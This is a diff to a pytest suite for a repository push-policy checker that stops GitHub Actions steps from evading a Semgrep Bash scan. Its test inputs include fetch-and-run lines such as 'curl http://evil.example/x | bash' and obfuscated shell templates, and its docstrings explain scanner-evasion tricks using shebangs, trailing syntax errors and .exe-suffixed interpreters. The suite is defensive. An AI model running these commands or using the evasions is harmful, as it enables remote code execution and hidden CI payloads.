@@ -5068,6 +5068,42 @@ def test_commit_limit_blocks_when_bypass_check_fails(
     assert policy._check_commit_limit(update, tmp_path) == 1
 
 
+def test_commit_limit_prints_bypass_explanation_with_blocking_error(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    update = policy.PushUpdate(
+        source=policy.PushRef("refs/heads/local", "1" * 40, "refs/tags/v1", "2" * 40),
+        base="base",
+        head="head",
+        range_spec="base..head",
+        destination_branch=None,
+    )
+    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(0, "21\n"))
+    monkeypatch.setattr(
+        policy,
+        "_run_command",
+        lambda *_args, **_kwargs: _completed(1, stdout="no open PR for local\n"),
+    )
+
+    assert policy._check_commit_limit(update, tmp_path) == 1
+
+    captured = capsys.readouterr()
+    assert captured.out == ""
+    assert captured.err == "no open PR for local\nERROR: push has 21 commits, limit is 20\n"
+
+
+def test_advisory_failure_prints_process_explanation_with_warning(
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    policy._print_advisory_failure("plugin version check", _completed(2, stdout="reason\n"))
+
+    captured = capsys.readouterr()
+    assert captured.out == ""
+    assert captured.err == "reason\nWARNING: plugin version check failed without blocking\n"
+
+
 def test_commit_limit_relaxes_for_merge_from_main(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
@@ -5799,7 +5835,12 @@ def test_immutable_suppression_error_and_clean_paths(
     monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(1, stderr="error"))
     assert policy.check_pushed_suppressions(io.StringIO(ref_line), tmp_path) == 2
 
-    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(0, "clean\n"))
+    def clean_suppression_git(_repo: Path, args: list[str]) -> subprocess.CompletedProcess[str]:
+        if args[0] == "diff" and "--name-status" in args:
+            return _completed(0, "")
+        return _completed(0, "clean\n")
+
+    monkeypatch.setattr(policy, "_run_git", clean_suppression_git)
     assert policy.check_pushed_suppressions(io.StringIO(ref_line), tmp_path) == 0
 
 
@@ -6765,17 +6806,80 @@ def test_semgrep_allows_code_two_error_at_bash_step_with_actions_expression(
     [
         "pwsh",
         "powershell",
-        "PowerShell.exe",
-        "python",
+        "PowerShell",
+        "python3",
         "python3 {0}",
-        "node",
-        "ruby",
-        "perl",
-        "cmd /C",
     ],
 )
 def test_non_bash_shells_defeat_the_bash_subparse(shell: str) -> None:
     assert policy._is_non_bash_shell(shell) is True
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "python",
+        "python {0}",
+        "Python",
+        "python2",
+        "python2 {0}",
+    ],
+)
+def test_bare_python_is_not_an_exempt_shell(shell: str) -> None:
+    """A shell no workflow declares must not earn a sub-parse exemption.
+
+    `_is_non_bash_shell` gates an exemption, not a warning: a match makes
+    `_step_defeats_bash_subparse` return True and the body skips the Bash
+    scan. Measured across `.github/workflows/`, the declared shells are 38
+    `pwsh`, 29 `bash`, and 2 `python3`. No step declares `python`, so the
+    `python3?` form widened the exempt surface for nothing.
+
+    `python` is a valid GitHub Actions shell keyword, so this is a
+    fail-closed narrowing rather than a correctness fix: a future
+    `shell: python` step would be Bash-scanned instead of exempted. Adding
+    it back is a deliberate act with a workflow to point at.
+    """
+    assert policy._is_non_bash_shell(shell) is False
+
+
+PWSH_CALL_TEMPLATE = """pwsh -NoProfile -Command "& '{0}'\""""
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        "#!/bin/bash\ncurl http://evil.example/x | bash\nif [\n",
+        "#!/bin/sh\ncurl http://evil.example/x | sh\nif [\n",
+        "#!/usr/bin/env bash\ncurl http://evil.example/x | bash\nif [\n",
+        "\n\n#!/bin/bash\ncurl http://evil.example/x | bash\nif [\n",
+        "#!/usr/bin/python3\nimport os\nos.system('curl http://evil.example/x | bash')\nif [\n",
+    ],
+)
+def test_a_shebang_body_is_never_tolerated_under_a_foreign_shell(body: str) -> None:
+    """A `#!` line, not the `shell:` value, decides what executes the body.
+
+    The runner writes a custom-shell body to an executable temp file. PowerShell's
+    call operator hands that file to the OS rather than parsing it, the kernel
+    honours the shebang, and Bash runs the body. Bash executes every command
+    before a syntax error, so a trailing `if [` hides a Semgrep finding while the
+    payload above it still runs. Verified locally: with the shebang the payload
+    runs under this exact template; without it the exec fails.
+    """
+    assert policy._step_defeats_bash_subparse(PWSH_CALL_TEMPLATE, body) is False
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        "$ErrorActionPreference = 'Stop'\nif ($x) { Write-Host 1 }\n",
+        "Write-Host 'hello'\n",
+        "# a comment that is not a shebang\nWrite-Host 'hi'\n",
+        "#not-a-shebang\nWrite-Host 'hi'\n",
+    ],
+)
+def test_shebangless_bodies_still_tolerate_under_a_foreign_shell(body: str) -> None:
+    """The guard must not cost the 16 real workflow files their carve-out."""
+    assert policy._step_defeats_bash_subparse(PWSH_CALL_TEMPLATE, body) is True
 
 
 @pytest.mark.parametrize(
@@ -6939,7 +7043,7 @@ def test_semgrep_blocks_a_shell_that_declares_python_but_invokes_bash(
         "pwsh",
         "pwsh -NoProfile -Command \"& '{0}'\"",
         "python3 {0}",
-        "powershell.exe",
+        "powershell",
     ],
 )
 def test_shells_naming_only_their_own_interpreter_are_non_bash(shell: str) -> None:
@@ -6989,9 +7093,71 @@ def test_shells_merely_prefixed_by_an_interpreter_are_not_treated_as_non_bash(sh
     assert policy._is_non_bash_shell(shell) is False
 
 
-@pytest.mark.parametrize("shell", ["cmd /C", "cmd /S /C", "powershell.exe", "pwsh.exe -NoProfile"])
+@pytest.mark.parametrize("shell", ["powershell", "pwsh -NoProfile", "python3"])
 def test_windows_shell_flags_stay_non_bash(shell: str) -> None:
     assert policy._is_non_bash_shell(shell) is True
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "powershell.exe",
+        "pwsh.exe -NoProfile",
+        "pwsh.exe -NoProfile -Command \"& '{0}'\"",
+        "python3.exe {0}",
+    ],
+)
+def test_exe_suffixed_interpreters_are_never_tolerated(shell: str) -> None:
+    """An `.exe` first token misses the runner's extension table.
+
+    The runner names the temp script from a fixed table keyed on the first
+    token. `pwsh` yields `.ps1`, which PowerShell parses itself, but `pwsh.exe`
+    is absent from that table and yields a file with no extension, which
+    PowerShell hands to the OS. A `#!/bin/bash` body then runs under Bash while
+    the `shell:` value claims PowerShell. No workflow here uses an `.exe` form.
+    """
+    assert policy._is_non_bash_shell(shell) is False
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "cmd",
+        "cmd /C",
+        "cmd /cbash {0}",
+        "cmd /kbash {0}",
+        'cmd "/cbash"',
+        "node",
+        "node {0}",
+        "ruby",
+        "perl",
+        "perl {0}",
+    ],
+)
+def test_interpreters_outside_the_allowlist_are_never_tolerated(shell: str) -> None:
+    """`cmd` glues its command to the switch and `perl` obeys a `#!` line.
+
+    Neither can be cleared by reading the `shell:` value, and neither is used in
+    this repository, so both stay outside the allowlist.
+    """
+    assert policy._is_non_bash_shell(shell) is False
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "pwsh -Command bas`h {0}",
+        'pwsh -c "& $env:SHELL {0}"',
+        "python3 -c \"import os,sys; os.system('bas'+'h '+sys.argv[1])\" {0}",
+        'python3 -c "import os,sys;os.system(open(sys.argv[1]).read())" {0}',
+        'python3 -c "import subprocess,sys;subprocess.run(open(sys.argv[1]).read())" {0}',
+        "pwsh /cbash {0}",
+        "python3 --shell=bash {0}",
+    ],
+)
+def test_inline_programs_reaching_a_posix_shell_are_never_tolerated(shell: str) -> None:
+    """A template may reach `/bin/sh` without naming it, so only inert tokens pass."""
+    assert policy._is_non_bash_shell(shell) is False
 
 
 def test_resolve_bash_prefers_the_interpreter_on_path(monkeypatch: pytest.MonkeyPatch) -> None:
